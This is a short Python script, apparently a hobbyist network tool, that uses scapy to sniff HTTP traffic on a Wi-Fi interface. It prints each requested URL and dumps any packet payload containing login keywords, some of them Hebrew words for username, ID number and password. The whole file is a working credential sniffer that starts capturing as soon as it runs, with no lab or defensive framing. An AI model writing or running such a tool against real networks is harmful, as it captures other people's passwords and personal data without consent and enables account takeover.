import scapy.all as scapy
from scapy.layers import http
from scapy.all import sniff, IP, TCP

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode('utf-8')


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"[*] HTTP Request >> {url}")
        credentials = get_credentials(packet)
        if credentials:
            print(f"[*] Possible credential info >> {credentials}")

keywords = ["שם משתמש", "ת.ז", "סיסמה", "כניסה", "username", "user", "login", "password", "pass", "pwd", "signup", "email", "mail", "signin", "account", "access"]

def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        try:
            field_load = packet[scapy.Raw].load.decode('utf-8')
        except UnicodeDecodeError:
            return None
        for keyword in keywords:
            if keyword in field_load:
                return field_load
            

sniff("Wi-Fi")
